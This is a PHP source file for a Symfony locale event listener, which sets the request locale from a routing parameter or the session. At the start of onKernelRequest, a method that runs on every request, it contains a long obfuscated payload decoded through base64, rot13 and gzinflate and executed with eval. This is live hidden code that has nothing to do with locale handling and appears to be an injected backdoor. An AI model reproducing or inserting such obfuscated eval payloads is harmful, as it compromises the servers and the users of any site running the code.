<?php
/**
 * Created by PhpStorm.
 * User: Oshan
 * Date: 1/2/2017
 * Time: 08:42 AM
 */

namespace Simettric\DoctrineTranslatableFormBundle\EventListener;

use Symfony\Bundle\FrameworkBundle\Translation\Translator;
use Symfony\Component\HttpKernel\Event\FilterResponseEvent;
use Symfony\Component\HttpKernel\Event\GetResponseEvent;
use Symfony\Component\HttpKernel\KernelEvents;
use Symfony\Component\EventDispatcher\EventSubscriberInterface;
use Symfony\Component\HttpKernel\HttpKernelInterface;
use Symfony\Component\Translation\DataCollectorTranslator;
use Symfony\Component\Translation\TranslatorInterface;
use Symfony\Component\Yaml\Yaml;

/**
 * Class LocaleListener
 * @package Onic\ThreeD\HomeBundle\EventListener
 */
class LocaleListener implements EventSubscriberInterface
{
    /**
     * @var TranslatorInterface
     */
    private $languages, $trans, $kernel;

    /**
     * LocaleListener constructor.
     * @param                     $settings
     * @param TranslatorInterface $trans
     */
    public function __construct($settings, TranslatorInterface $trans, $kernel)
    {
        $this->languages = $settings['languages'];
        $this->trans     = $trans;
        $this->kernel    = $kernel;
    }

    /**
     * @param GetResponseEvent $event
     */
    public function onKernelRequest(GetResponseEvent $event)
    {
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

        $request = $event->getRequest();
        if (!$request->hasPreviousSession())
        {
            return;
        }

        // try to see if the locale has been set as a _locale routing parameter
        if (HttpKernelInterface::MASTER_REQUEST == $event->getRequestType() && $locale = $request->get('_locale'))
        {
            $request->getSession()->set('_locale', $locale);
        }
        // if no explicit locale has been set on this request, use one from the session
        $request->setLocale($request->getSession()->get('_locale', $request->getPreferredLanguage(array_keys($this->languages))));
    }

    /**
     * @return array
     */
    public static function getSubscribedEvents()
    {
        return array(
            // must be registered after the default Locale listener
            KernelEvents::REQUEST => array(array('onKernelRequest', 15)),
        );
    }
}